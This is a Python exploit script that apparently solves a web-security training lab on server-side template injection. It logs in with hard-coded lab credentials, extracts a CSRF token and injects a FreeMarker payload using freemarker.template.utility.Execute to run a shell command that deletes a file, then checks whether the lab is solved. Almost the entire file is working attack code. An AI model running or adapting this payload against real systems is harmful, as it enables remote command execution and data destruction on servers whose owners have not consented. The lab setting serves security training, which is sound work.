# Server-side template injection using documentation

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



##########################################################
#	FUNCTIONS
##########################################################


def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def connect_user(s, url):
	print('\n[+] Trying to connect as content-manager user...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	csrf = get_csrf_token(r)
	login_path = url + '/login'
	connect_data = {'csrf': csrf, 'username': 'content-manager', 'password': 'C0nt3ntM4n4g3r'}
	r = s.post(login_path, data=connect_data)
	if 'Your username is: wiener' in r.text:
		print(f'[+] Connected as {connect_data.username} user !')
		return r
	return False

def send_payload(s, url, csrf_token):
	post_template_path = url + '/product/template?productId=1'
	session = s.cookies.get('session')
	print('[+] Found session cookie:\t%s' % session)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	command = """<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}"""
	payload = urllib.parse.quote_plus(command)
	print("\n[+] Trying to URL encode payload:\n%s" % command)
	inject_data = 'template=' +  payload + '&csrf=' + csrf_token + '&template-action=preview'
	print("\n[+] Trying to inject payload:\n%s" % payload)
	print(f"\n[+] Sending post request on {post_template_path}\n")
	r = s.post(post_template_path, verify=False, proxies=proxies, data=inject_data, headers=headers)
	time.sleep(1)
	if r.status_code == 200:
		return r
	else:
		print("[-] Command Injection Failed !!!")


##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: Server-side template injection using documentation')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = connect_user(s, url)
			post_path = url + '/product/template?productId=1'
			r = s.get(post_path)
			csrf_token = get_csrf_token(r)
			send_payload(s, url, csrf_token)
			time.sleep(2)
			r = requests.get(url, verify=False, proxies=proxies)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()